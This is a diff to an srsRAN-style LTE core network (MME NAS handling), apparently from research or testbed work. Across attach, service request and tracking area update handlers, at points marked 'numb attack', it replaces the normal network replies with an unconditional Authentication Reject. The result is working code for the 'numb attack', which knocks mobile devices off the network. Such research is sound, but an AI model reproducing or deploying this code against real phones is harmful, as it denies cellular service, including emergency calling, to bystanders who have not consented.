@@ -81,131 +81,125 @@ bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
                                 const nas_if_t&         itf)
 {
   // ============================ !!!numb attack!!! =========================
+    uint32_t                                       m_tmsi      = 0;
+    uint64_t                                       imsi        = 0;
+    LIBLTE_MME_ATTACH_REQUEST_MSG_STRUCT           attach_req  = {};
+    LIBLTE_MME_PDN_CONNECTIVITY_REQUEST_MSG_STRUCT pdn_con_req = {};
+    auto&                                          nas_logger  = srslog::fetch_basic_logger("NAS");
 
-  srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
-  pack_authentication_reject(nas_tx.get());
-  m_s1ap->send_downlink_nas_transport(
-      m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+    // Interfaces
+    s1ap_interface_nas* s1ap = itf.s1ap;
+    hss_interface_nas*  hss  = itf.hss;
+    gtpc_interface_nas* gtpc = itf.gtpc;
 
-  //  uint32_t                                       m_tmsi      = 0;
-  //  uint64_t                                       imsi        = 0;
-  //  LIBLTE_MME_ATTACH_REQUEST_MSG_STRUCT           attach_req  = {};
-  //  LIBLTE_MME_PDN_CONNECTIVITY_REQUEST_MSG_STRUCT pdn_con_req = {};
-  //  auto&                                          nas_logger  = srslog::fetch_basic_logger("NAS");
-  //
-  //  // Interfaces
-  //  s1ap_interface_nas* s1ap = itf.s1ap;
-  //  hss_interface_nas*  hss  = itf.hss;
-  //  gtpc_interface_nas* gtpc = itf.gtpc;
-  //
-  //  // Get NAS Attach Request and PDN connectivity request messages
-  //  LIBLTE_ERROR_ENUM err = liblte_mme_unpack_attach_request_msg((LIBLTE_BYTE_MSG_STRUCT*)nas_rx, &attach_req);
-  //  if (err != LIBLTE_SUCCESS) {
-  //    nas_logger.error("Error unpacking NAS attach request. Error: %s", liblte_error_text[err]);
-  //    return false;
-  //  }
-  //  // Get PDN Connectivity Request*/
-  //  err = liblte_mme_unpack_pdn_connectivity_request_msg(&attach_req.esm_msg, &pdn_con_req);
-  //  if (err != LIBLTE_SUCCESS) {
-  //    nas_logger.error("Error unpacking NAS PDN Connectivity Request. Error: %s", liblte_error_text[err]);
-  //    return false;
-  //  }
-  //
-  //  // Get UE IMSI
-  //  if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-  //    for (int i = 0; i <= 14; i++) {
-  //      imsi += attach_req.eps_mobile_id.imsi[i] * std::pow(10, 14 - i);
-  //    }
-  //    srsran::console("Attach request -- IMSI: %015" PRIu64 "\n", imsi);
-  //    nas_logger.info("Attach request -- IMSI: %015" PRIu64 "", imsi);
-  //  } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-  //    m_tmsi = attach_req.eps_mobile_id.guti.m_tmsi;
-  //    imsi   = s1ap->find_imsi_from_m_tmsi(m_tmsi);
-  //    srsran::console("Attach request -- M-TMSI: 0x%x\n", m_tmsi);
-  //    nas_logger.info("Attach request -- M-TMSI: 0x%x", m_tmsi);
-  //  } else {
-  //    nas_logger.error("Unhandled Mobile Id type in attach request");
-  //    return false;
-  //  }
-  //
-  //  // Log Attach Request Information
-  //  srsran::console("Attach request -- eNB-UE S1AP Id: %d\n", enb_ue_s1ap_id);
-  //  nas_logger.info("Attach request -- eNB-UE S1AP Id: %d", enb_ue_s1ap_id);
-  //  srsran::console("Attach request -- Attach type: %d\n", attach_req.eps_attach_type);
-  //  nas_logger.info("Attach request -- Attach type: %d", attach_req.eps_attach_type);
-  //  srsran::console("Attach Request -- UE Network Capabilities EEA: %d%d%d%d%d%d%d%d\n",
-  //                  attach_req.ue_network_cap.eea[0],
-  //                  attach_req.ue_network_cap.eea[1],
-  //                  attach_req.ue_network_cap.eea[2],
-  //                  attach_req.ue_network_cap.eea[3],
-  //                  attach_req.ue_network_cap.eea[4],
-  //                  attach_req.ue_network_cap.eea[5],
-  //                  attach_req.ue_network_cap.eea[6],
-  //                  attach_req.ue_network_cap.eea[7]);
-  //  nas_logger.info("Attach Request -- UE Network Capabilities EEA: %d%d%d%d%d%d%d%d",
-  //                  attach_req.ue_network_cap.eea[0],
-  //                  attach_req.ue_network_cap.eea[1],
-  //                  attach_req.ue_network_cap.eea[2],
-  //                  attach_req.ue_network_cap.eea[3],
-  //                  attach_req.ue_network_cap.eea[4],
-  //                  attach_req.ue_network_cap.eea[5],
-  //                  attach_req.ue_network_cap.eea[6],
-  //                  attach_req.ue_network_cap.eea[7]);
-  //  srsran::console("Attach Request -- UE Network Capabilities EIA: %d%d%d%d%d%d%d%d\n",
-  //                  attach_req.ue_network_cap.eia[0],
-  //                  attach_req.ue_network_cap.eia[1],
-  //                  attach_req.ue_network_cap.eia[2],
-  //                  attach_req.ue_network_cap.eia[3],
-  //                  attach_req.ue_network_cap.eia[4],
-  //                  attach_req.ue_network_cap.eia[5],
-  //                  attach_req.ue_network_cap.eia[6],
-  //                  attach_req.ue_network_cap.eia[7]);
-  //  nas_logger.info("Attach Request -- UE Network Capabilities EIA: %d%d%d%d%d%d%d%d",
-  //                  attach_req.ue_network_cap.eia[0],
-  //                  attach_req.ue_network_cap.eia[1],
-  //                  attach_req.ue_network_cap.eia[2],
-  //                  attach_req.ue_network_cap.eia[3],
-  //                  attach_req.ue_network_cap.eia[4],
-  //                  attach_req.ue_network_cap.eia[5],
-  //                  attach_req.ue_network_cap.eia[6],
-  //                  attach_req.ue_network_cap.eia[7]);
-  //  srsran::console("Attach Request -- MS Network Capabilities Present: %s\n",
-  //                  attach_req.ms_network_cap_present ? "true" : "false");
-  //  nas_logger.info("Attach Request -- MS Network Capabilities Present: %s",
-  //                  attach_req.ms_network_cap_present ? "true" : "false");
-  //  srsran::console("PDN Connectivity Request -- EPS Bearer Identity requested: %d\n", pdn_con_req.eps_bearer_id);
-  //  nas_logger.info("PDN Connectivity Request -- EPS Bearer Identity requested: %d", pdn_con_req.eps_bearer_id);
-  //  srsran::console("PDN Connectivity Request -- Procedure Transaction Id: %d\n", pdn_con_req.proc_transaction_id);
-  //  nas_logger.info("PDN Connectivity Request -- Procedure Transaction Id: %d", pdn_con_req.proc_transaction_id);
-  //  srsran::console("PDN Connectivity Request -- ESM Information Transfer requested: %s\n",
-  //                  pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
-  //  nas_logger.info("PDN Connectivity Request -- ESM Information Transfer requested: %s",
-  //                  pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
-  //
-  //  // Get NAS Context if UE is known
-  //  nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
-  //  if (nas_ctx == NULL) {
-  //    // Get attach type from attach request
-  //    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-  //      nas::handle_imsi_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-  //    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-  //      nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-  //    } else {
-  //      return false;
-  //    }
-  //  } else {
-  //    nas_logger.info("Attach Request -- Found previously attached UE.");
-  //    srsran::console("Attach Request -- Found previously attach UE.\n");
-  //    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-  //      nas::handle_imsi_attach_request_known_ue(
-  //          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-  //    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-  //      nas::handle_guti_attach_request_known_ue(
-  //          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-  //    } else {
-  //      return false;
-  //    }
-  //  }
+    // Get NAS Attach Request and PDN connectivity request messages
+    LIBLTE_ERROR_ENUM err = liblte_mme_unpack_attach_request_msg((LIBLTE_BYTE_MSG_STRUCT*)nas_rx, &attach_req);
+    if (err != LIBLTE_SUCCESS) {
+      nas_logger.error("Error unpacking NAS attach request. Error: %s", liblte_error_text[err]);
+      return false;
+    }
+    // Get PDN Connectivity Request*/
+    err = liblte_mme_unpack_pdn_connectivity_request_msg(&attach_req.esm_msg, &pdn_con_req);
+    if (err != LIBLTE_SUCCESS) {
+      nas_logger.error("Error unpacking NAS PDN Connectivity Request. Error: %s", liblte_error_text[err]);
+      return false;
+    }
+
+    // Get UE IMSI
+    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
+      for (int i = 0; i <= 14; i++) {
+        imsi += attach_req.eps_mobile_id.imsi[i] * std::pow(10, 14 - i);
+      }
+      srsran::console("Attach request -- IMSI: %015" PRIu64 "\n", imsi);
+      nas_logger.info("Attach request -- IMSI: %015" PRIu64 "", imsi);
+    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
+      m_tmsi = attach_req.eps_mobile_id.guti.m_tmsi;
+      imsi   = s1ap->find_imsi_from_m_tmsi(m_tmsi);
+      srsran::console("Attach request -- M-TMSI: 0x%x\n", m_tmsi);
+      nas_logger.info("Attach request -- M-TMSI: 0x%x", m_tmsi);
+    } else {
+      nas_logger.error("Unhandled Mobile Id type in attach request");
+      return false;
+    }
+
+    // Log Attach Request Information
+    srsran::console("Attach request -- eNB-UE S1AP Id: %d\n", enb_ue_s1ap_id);
+    nas_logger.info("Attach request -- eNB-UE S1AP Id: %d", enb_ue_s1ap_id);
+    srsran::console("Attach request -- Attach type: %d\n", attach_req.eps_attach_type);
+    nas_logger.info("Attach request -- Attach type: %d", attach_req.eps_attach_type);
+    srsran::console("Attach Request -- UE Network Capabilities EEA: %d%d%d%d%d%d%d%d\n",
+                    attach_req.ue_network_cap.eea[0],
+                    attach_req.ue_network_cap.eea[1],
+                    attach_req.ue_network_cap.eea[2],
+                    attach_req.ue_network_cap.eea[3],
+                    attach_req.ue_network_cap.eea[4],
+                    attach_req.ue_network_cap.eea[5],
+                    attach_req.ue_network_cap.eea[6],
+                    attach_req.ue_network_cap.eea[7]);
+    nas_logger.info("Attach Request -- UE Network Capabilities EEA: %d%d%d%d%d%d%d%d",
+                    attach_req.ue_network_cap.eea[0],
+                    attach_req.ue_network_cap.eea[1],
+                    attach_req.ue_network_cap.eea[2],
+                    attach_req.ue_network_cap.eea[3],
+                    attach_req.ue_network_cap.eea[4],
+                    attach_req.ue_network_cap.eea[5],
+                    attach_req.ue_network_cap.eea[6],
+                    attach_req.ue_network_cap.eea[7]);
+    srsran::console("Attach Request -- UE Network Capabilities EIA: %d%d%d%d%d%d%d%d\n",
+                    attach_req.ue_network_cap.eia[0],
+                    attach_req.ue_network_cap.eia[1],
+                    attach_req.ue_network_cap.eia[2],
+                    attach_req.ue_network_cap.eia[3],
+                    attach_req.ue_network_cap.eia[4],
+                    attach_req.ue_network_cap.eia[5],
+                    attach_req.ue_network_cap.eia[6],
+                    attach_req.ue_network_cap.eia[7]);
+    nas_logger.info("Attach Request -- UE Network Capabilities EIA: %d%d%d%d%d%d%d%d",
+                    attach_req.ue_network_cap.eia[0],
+                    attach_req.ue_network_cap.eia[1],
+                    attach_req.ue_network_cap.eia[2],
+                    attach_req.ue_network_cap.eia[3],
+                    attach_req.ue_network_cap.eia[4],
+                    attach_req.ue_network_cap.eia[5],
+                    attach_req.ue_network_cap.eia[6],
+                    attach_req.ue_network_cap.eia[7]);
+    srsran::console("Attach Request -- MS Network Capabilities Present: %s\n",
+                    attach_req.ms_network_cap_present ? "true" : "false");
+    nas_logger.info("Attach Request -- MS Network Capabilities Present: %s",
+                    attach_req.ms_network_cap_present ? "true" : "false");
+    srsran::console("PDN Connectivity Request -- EPS Bearer Identity requested: %d\n", pdn_con_req.eps_bearer_id);
+    nas_logger.info("PDN Connectivity Request -- EPS Bearer Identity requested: %d", pdn_con_req.eps_bearer_id);
+    srsran::console("PDN Connectivity Request -- Procedure Transaction Id: %d\n", pdn_con_req.proc_transaction_id);
+    nas_logger.info("PDN Connectivity Request -- Procedure Transaction Id: %d", pdn_con_req.proc_transaction_id);
+    srsran::console("PDN Connectivity Request -- ESM Information Transfer requested: %s\n",
+                    pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
+    nas_logger.info("PDN Connectivity Request -- ESM Information Transfer requested: %s",
+                    pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
+
+    // Get NAS Context if UE is known
+    nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
+    if (nas_ctx == NULL) {
+      // Get attach type from attach request
+      if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
+        nas::handle_imsi_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
+      } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
+        nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
+      } else {
+        return false;
+      }
+    } else {
+      nas_logger.info("Attach Request -- Found previously attached UE.");
+      srsran::console("Attach Request -- Found previously attach UE.\n");
+      if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
+        nas::handle_imsi_attach_request_known_ue(
+            nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
+      } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
+        nas::handle_guti_attach_request_known_ue(
+            nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
+      } else {
+        return false;
+      }
+    }
 
   return true;
 }
@@ -299,7 +293,9 @@ bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                        
     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  nas_ctx->pack_authentication_request(nas_tx.get());
+
+  // ===================== !!! numb attack !!! ==========================
+  nas_ctx->pack_authentication_reject(nas_tx.get());
 
   // Send reply to eNB
   s1ap->send_downlink_nas_transport(
@@ -412,7 +408,8 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
     srslog::fetch_basic_logger("NAS").error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  nas_ctx->pack_identity_request(nas_tx.get());
+  // =================================== !!! numb attack !!! =======================================
+  nas_ctx->pack_authentication_reject(nas_tx.get());
   s1ap->send_downlink_nas_transport(
       nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
 
@@ -495,7 +492,8 @@ bool nas::handle_guti_attach_request_known_ue(nas*                              
     if (ecm_ctx->eit) {
       srsran::console("Secure ESM information transfer requested.\n");
       nas_logger.info("Secure ESM information transfer requested.");
-      nas_ctx->pack_esm_information_request(nas_tx.get());
+      // ====================== !!! numb attack !!! ==========================
+      nas_ctx->pack_authentication_reject(nas_tx.get());
       s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
     } else {
       // Get subscriber info from HSS
@@ -569,7 +567,8 @@ bool nas::handle_guti_attach_request_known_ue(nas*                              
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    nas_ctx->pack_authentication_request(nas_tx.get());
+    // ====================== !!! numb attack !!! ==========================
+    nas_ctx->pack_authentication_reject(nas_tx.get());
 
     // Send reply to eNB
     s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
@@ -622,7 +621,8 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    nas_tmp.pack_service_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+    // ====================== !!! numb attack !!! ==========================
+    nas_tmp.pack_authentication_reject(nas_tx.get());
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
     return true;
   }
@@ -640,7 +640,8 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    nas_tmp.pack_service_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+    // ====================== !!! numb attack !!! ==========================
+    nas_tmp.pack_authentication_reject(nas_tx.get());
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
     return true;
   }
@@ -724,7 +725,7 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    nas_ctx->pack_service_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+    nas_ctx->pack_authentication_reject(nas_tx.get());
     s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
 
     srsran::console("Service Request -- Short MAC invalid. Sending service reject.\n");
@@ -857,7 +858,8 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+  // ====================== !!! numb attack !!! ==========================
+  nas_tmp.pack_authentication_reject(nas_tx.get());
   s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
   return true;
 }
@@ -964,7 +966,8 @@ bool nas::handle_attach_request(srsran::byte_buffer_t* nas_rx)
       m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    pack_authentication_request(nas_tx.get());
+    // ====================== !!! numb attack !!! ==========================
+    pack_authentication_reject(nas_tx.get());
 
     // Send reply to eNB
     m_s1ap->send_downlink_nas_transport(
